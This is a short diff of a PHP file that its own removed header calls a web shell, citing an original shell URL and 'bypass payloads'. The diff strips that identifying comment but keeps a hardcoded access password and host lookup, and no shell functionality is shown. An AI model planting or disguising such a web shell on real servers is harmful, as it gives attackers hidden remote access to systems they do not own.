@@ -1,12 +1,6 @@
 <?php
-/**
- * Fixed and Optimized Web Shell
- * Original: https://raw.githubusercontent.com/paylar/NewShell/refs/heads/main/23bin
- * Fixes: Added authentication, fixed CGI summoning, optimized bypass payloads.
- */
 
-// --- CONFIGURATION ---
-$password = "Lewster1337@$"; // Default password
+$password = "Lewster1337@$"; 
 $nm   = 'user';
 $serv = gethostname();
 
